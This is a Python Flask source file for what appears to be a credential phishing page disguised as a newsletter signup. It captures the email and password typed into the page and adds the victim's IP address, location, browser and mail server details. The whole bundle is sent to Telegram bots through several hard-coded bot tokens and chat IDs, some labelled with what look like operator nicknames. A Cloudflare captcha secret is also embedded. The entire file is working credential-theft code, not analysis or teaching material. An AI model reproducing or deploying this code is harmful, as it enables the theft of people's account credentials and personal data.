import os
import socket
import dns.resolver
from datetime import datetime
from flask import Flask, render_template, request
import requests

# Telegram Main Bot credentials (replace with your actual bot token and chat ID)
TELEGRAM_BOT_TOKEN = '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms'
TELEGRAM_CHAT_ID = '7608981070'

# # Secondary Telegram Bot credentials (placeholders for Circle)
# SECONDARY_TELEGRAM_BOT_TOKEN = '8154915769:AAF6fwbJnfF9AZpRDqgT40DZn4oZfzQh5f0'
# SECONDARY_TELEGRAM_CHAT_ID = '6019518989'

# # Secondary Telegram Bot credentials (placeholders for Izu)
# SECONDARY_TELEGRAM_BOT_TOKEN = '8223867988:AAFhuQnYpOwEj-7mt3WSKQRMow7xWOV3L9U'
# SECONDARY_TELEGRAM_CHAT_ID = '6380136159'

# # Secondary Telegram Bot credentials (placeholders for Lukki)
# SECONDARY_TELEGRAM_BOT_TOKEN = '8006398254:AAFxnSjATtqMl-Jj7ZVZC4kBEo26d4TCa1o'
# SECONDARY_TELEGRAM_CHAT_ID = '1329439508'

# # Secondary Telegram Bot credentials (placeholders FG)
SECONDARY_TELEGRAM_BOT_TOKEN = '8268331175:AAENSer5qi5GCNQJwtXgUS79URFnFicEuSs'
SECONDARY_TELEGRAM_CHAT_ID = '1562794916'

# # Secondary Telegram Bot credentials (placeholders for FG COUS)
# SECONDARY_TELEGRAM_BOT_TOKEN = '8006398254:AAFxnSjATtqMl-Jj7ZVZC4kBEo26d4TCa1o'
# SECONDARY_TELEGRAM_CHAT_ID = '1329439508'

app = Flask(__name__)
CLEARBIT_LOGO_API = "https://logo.clearbit.com/"

def get_domain_from_email(email):
    """Extract domain from email address."""
    if '@' in email:
        return email.split('@')[1]
    return None

def get_user_ip():
    """Get user's real IP address, handling proxies and local development."""
    # Check for forwarded IP headers (when behind proxy/load balancer)
    forwarded_ips = request.environ.get('HTTP_X_FORWARDED_FOR')
    if forwarded_ips:
        # X-Forwarded-For can contain multiple IPs, take the first (original client)
        ip = forwarded_ips.split(',')[0].strip()
        if ip and not ip.startswith('127.') and not ip.startswith('192.168.') and not ip.startswith('10.'):
            return ip
    
    # Check other common proxy headers
    real_ip = request.environ.get('HTTP_X_REAL_IP')
    if real_ip and not real_ip.startswith('127.') and not real_ip.startswith('192.168.') and not real_ip.startswith('10.'):
        return real_ip
    
    # Check Cloudflare specific header
    cf_ip = request.environ.get('HTTP_CF_CONNECTING_IP')
    if cf_ip and not cf_ip.startswith('127.') and not cf_ip.startswith('192.168.') and not cf_ip.startswith('10.'):
        return cf_ip
    
    # Fall back to remote address
    remote_addr = request.environ.get('REMOTE_ADDR', 'Unknown')
    
    # If we're getting localhost/private IPs, try to get public IP via external service
    if remote_addr in ['127.0.0.1', 'localhost'] or remote_addr.startswith('192.168.') or remote_addr.startswith('10.'):
        try:
            # Get public IP from external service
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                public_ip = response.text.strip()
                return f"{public_ip} (via ipify - local detected: {remote_addr})"
        except:
            pass
        return f"{remote_addr} (local/private network)"
    
    return remote_addr

def get_location_from_ip(ip):
    """Get city and country from IP using ipapi.co (free service)."""
    try:
        # Extract just the IP if it contains additional info
        clean_ip = ip.split(' ')[0] if ' ' in ip else ip
        
        if clean_ip and clean_ip != 'Unknown' and not clean_ip.startswith('127.') and not clean_ip.startswith('192.168.') and not clean_ip.startswith('10.'):
            response = requests.get(f'http://ipapi.co/{clean_ip}/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                city = data.get('city', 'Unknown')
                country = data.get('country_name', 'Unknown')
                return city, country
    except:
        pass
    return 'Unknown (Local/Private Network)', 'Unknown (Local/Private Network)'

def get_user_browser():
    """Get user's browser from User-Agent."""
    user_agent = request.headers.get('User-Agent', 'Unknown')
    if 'Chrome' in user_agent:
        return 'Chrome'
    elif 'Firefox' in user_agent:
        return 'Firefox'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        return 'Safari'
    elif 'Edge' in user_agent:
        return 'Edge'
    elif 'Opera' in user_agent:
        return 'Opera'
    else:
        return 'Unknown'

def get_mx_record(domain):
    """Get MX record for a domain."""
    try:
        import dns.resolver
        mx_records = dns.resolver.resolve(domain, 'MX')
        return str(mx_records[0].exchange) if mx_records else 'No MX record'
    except:
        # Fallback method using socket if dnspython is not available
        try:
            import subprocess
            result = subprocess.run(['nslookup', '-type=MX', domain], 
                                  capture_output=True, text=True, timeout=10)
            if 'mail exchanger' in result.stdout.lower():
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'mail exchanger' in line.lower():
                        return line.split('=')[-1].strip()
        except:
            pass
        return 'Unable to resolve MX'

def send_to_telegram(bot_token, chat_id, message):
    """Send a message to a Telegram chat using a bot token."""
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message}
    try:
        resp = requests.post(url, data=payload)
        return resp.status_code == 200
    except Exception as e:
        print(f'Telegram send error: {e}')
        return False

@app.route('/', methods=['GET', 'POST'])
def signup():
    """Handle newsletter signup and send data to Telegram."""
    if request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        turnstile_response = request.form.get('cf-turnstile-response', '')
    else:
        email = request.args.get('email', '')
        password = ''
        turnstile_response = ''

    domain = get_domain_from_email(email) if email else None
    logo_url = f"{CLEARBIT_LOGO_API}{domain}" if domain else None
    error = None

    if request.method == 'POST':
        # Validate password
        if not password:
            error = 'Authentication is required.'
        # Validate captcha
        if not turnstile_response:
            error = 'Captcha is required.'
        else:
            secret_key = '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM'
            verify_url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify'
            data = {
                'secret': secret_key,
                'response': turnstile_response
            }
            resp = requests.post(verify_url, data=data)
            result = resp.json()
            if not result.get('success'):
                error = 'Captcha validation failed.'

        # Send to Telegram if no errors
        if not error:
            # Get additional user information
            user_ip = get_user_ip()
            city, country = get_location_from_ip(user_ip)
            browser = get_user_browser()
            mx_record = get_mx_record(domain) if domain else 'N/A'
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
            
            # Create enhanced message with all requested details
            msg = f"""🎯 New Signup Alert!

Email: {email}
Password: {password}

📊 Additional Details:
IP Address: {user_ip}
City: {city}
Country: {country}
Browser: {browser}
MX Record: {mx_record}
Date of Submission: {timestamp}"""

            # Send to main Telegram bot
            main_success = send_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, msg)
            if main_success:
                print("✅ Message sent to main Telegram bot successfully!")
            else:
                print("❌ Failed to send message to main Telegram bot")
            
            # Send to secondary bot if credentials are defined (uncommented)
            try:
                if SECONDARY_TELEGRAM_BOT_TOKEN and SECONDARY_TELEGRAM_CHAT_ID:
                    secondary_success = send_to_telegram(SECONDARY_TELEGRAM_BOT_TOKEN, SECONDARY_TELEGRAM_CHAT_ID, msg)
                    if secondary_success:
                        print("✅ Message sent to secondary Telegram bot successfully!")
                    else:
                        print("❌ Failed to send message to secondary Telegram bot")
                else:
                    print("ℹ️ No secondary Telegram bot configured")
            except NameError:
                print("ℹ️ Secondary Telegram bot credentials not defined (commented out)")

    return render_template('he-opas.html', email=email, password=password, domain=domain, logo_url=logo_url, error=error)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
